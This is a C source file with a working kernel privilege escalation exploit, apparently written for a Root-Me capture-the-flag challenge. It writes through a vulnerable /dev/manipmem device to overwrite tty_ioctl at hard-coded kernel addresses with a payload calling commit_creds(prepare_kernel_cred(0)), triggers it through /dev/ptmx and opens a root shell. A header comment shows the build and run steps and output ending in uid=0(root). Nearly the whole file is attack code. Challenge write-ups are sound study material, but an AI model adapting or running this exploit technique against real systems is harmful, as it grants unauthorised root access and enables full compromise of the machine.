/*
  On a linux machine:
  vagrant@ubuntu-focal:~$ gcc -o exploit physical_memory_write.c  -static
  
  On the target machine:
  Root-Me user@linkern-chall:~$ /mnt/share/exploit
  [+] Offset set at page number 0x13ee
  [+] Overwriting tty_ioctl with lpe payload
  [+] Releasing file descriptor to execute shellcode
  [+] Got root
  /bin/sh: can't access tty; job control turned off
  /home/user # id
  uid=0(root) gid=0

*/

#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

#define DEV "/dev/manipmem"

#define PAGE_SIZE 4096
#define PAGE_OFFSET 0xffffffff80000000LL
#define PAGE_SHIFT 12
#define SHELLCODE_LENGTH 0x3d

#define TTY_IOCTL 0xffffffff813ee8f0LL
#define COMMIT_CREDS 0xffffffff8107ab70LL
#define PREPARE_KERNEL_CRED 0xffffffff8107af00LL

char *read_pages(int fd, int page_number)
{
  char *buffer = (char*) malloc(page_number * PAGE_SIZE);
  
  if (read(fd, buffer, page_number * PAGE_SIZE) < 0) {
    perror("[!] Failed to read in device");
    return NULL;
  }

  for (unsigned int i = 0; i < page_number; i++) {
    printf("buffer for page %d\n", i);
    for (unsigned int j = i * PAGE_SIZE; j < (i+1) * PAGE_SIZE; j++) {
      printf("%x", buffer[j] & 0xff);
    }
    printf("\n");
  }
  return buffer;
}

void shell(){
    char *shell = "/bin/sh";
    char *args[] = {shell, "-i", NULL};
    execve(shell, args, NULL);
}

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

//target function int tty_release(int fd, int args...)
int __attribute__((regparm(3))) kernel_payload(int foo) {
  _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
  _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;
  commit_creds(prepare_kernel_cred(0));
  return -1;
}

void exploit(int fd)
{
  unsigned int target_page = (TTY_IOCTL - PAGE_OFFSET) >> PAGE_SHIFT;
  unsigned int target_offset = TTY_IOCTL & 0xfffLL;

  char *b = (char*) malloc(PAGE_SIZE);
  
  memset(b, 0x90, target_offset);
  memcpy(b + target_offset, kernel_payload, SHELLCODE_LENGTH);
  

  printf("[+] Offset set at page number 0x%x\n", target_page);
  lseek(fd, target_page*PAGE_SIZE, 0); 
  
  printf("[+] Overwriting tty_ioctl with lpe payload\n");
  write(fd, b, PAGE_SIZE);
}


int main(void)
{
  int fd, pwn;
 
  fd = open(DEV, O_RDWR);
  if (fd < 0) {
    perror("[!] Failed to open device");
    exit(EXIT_FAILURE);
  }

  exploit(fd);

  pwn = open("/dev/ptmx", 'r');
  printf("[+] Releasing file descriptor to execute shellcode\n");
  close(pwn);

  // FIXME: any return of main will crash the machine, can't getuid() and exit if not zero
  printf("[+] Got root\n");
  shell();

  close(fd);
  return 0;
}


